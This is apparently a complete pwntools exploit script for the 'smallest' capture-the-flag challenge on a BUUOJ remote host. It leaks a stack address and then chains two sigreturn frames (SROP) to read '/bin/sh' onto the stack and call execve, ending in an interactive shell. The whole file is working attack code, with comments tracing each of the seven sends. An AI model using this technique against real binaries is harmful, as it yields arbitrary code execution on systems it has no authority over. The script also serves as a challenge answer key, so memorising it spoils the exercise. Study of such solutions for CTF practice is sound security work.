from pwn import *
context(os="linux", arch="amd64")

g_fname = "./smallest"

def debug_on():
	context.log_level = "debug"

if args["REMOTE"]:
	g_io = remote("node3.buuoj.cn", 28731)
else:
	g_io = process(g_fname)
#	gdb.attach(g_io)
#	pause()
def getpid():
	if args["REMOTE"] == "":
		print("PID:%d", g_io.proc.pid)
		pause()

def pwn():
	start_addr = 0x4000b0	
	sys_ret_addr = 0x4000be

	# read to stack, make it looks like:
	# |start_addr|start_addr|start_addr|...
	g_io.send(p64(start_addr)*3)
	
	# 2nd read 1 byte, make rax==1, and skip 'xor rax, rax'
	# equivalent to write(1, $rsp, 0x400)
	g_io.send(b'\xb3')

	# 3rd. ret to syscall(__NR_write, 1, $rsp, 0x400)
	stack_addr = u64(g_io.recv()[8:16]) & 0xfffffffffffff000
	log.success("stack addr = %#x", stack_addr)

	# 4th. ret to start. read sigreturn-frame
	sf = SigreturnFrame()
	## read(0, stack_addr, 0x400)
	sf.rax = int(constants.SYS_read)
	sf.rdi = 0
	sf.rsi = stack_addr
	sf.rdx = 0x400
	sf.rsp = stack_addr + 0x120
	sf.rip = sys_ret_addr
	payload = flat([start_addr, 'a'*8, sf])
	g_io.send(payload)

	# 5th. make rax=15, sys_sigreturn
	payload_sigret = p64(sys_ret_addr) + b'b'*7
	g_io.send(payload_sigret)

	# 6th. read(0, stack_addr+0x120, 0x400) <- "/bin/sh"
	sf = SigreturnFrame()
	sf.rax = int(constants.SYS_execve)
	sf.rsp = stack_addr + 0x120
	sf.rdi = stack_addr
	sf.rsi = sf.rdx = 0
	sf.rip = sys_ret_addr
	g_io.send(flat(["/bin/sh\x00".ljust(0x120), start_addr, 0xdeadbeef , sf]))

	# 7th. make rax=15, ret to syscall
	g_io.send(payload_sigret)


if "__main__" == __name__:
	if (args.DEBUG):
		debug_on()
	pwn()
	g_io.interactive()
